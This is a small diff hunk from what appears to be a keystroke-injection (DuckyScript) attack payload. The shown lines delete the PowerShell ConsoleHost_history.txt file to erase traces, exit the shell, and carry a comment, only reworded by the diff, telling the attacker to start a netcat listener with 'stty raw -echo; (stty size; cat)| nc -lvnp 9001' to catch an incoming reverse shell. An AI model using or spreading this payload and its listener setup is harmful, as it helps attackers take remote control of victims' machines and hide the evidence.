@@ -52,5 +52,4 @@ STRING rm .\ConsoleHost_history.txt
 ENTER
 STRING exit
 ENTER
-REM Use this command in the shell of a linux to listen to the connextion : stty raw -echo; (stty size; cat)| nc -lvnp 9001
-
+REM Use this command in the shell of a linux to listen to the incomming connextion : stty raw -echo; (stty size; cat)| nc -lvnp 9001
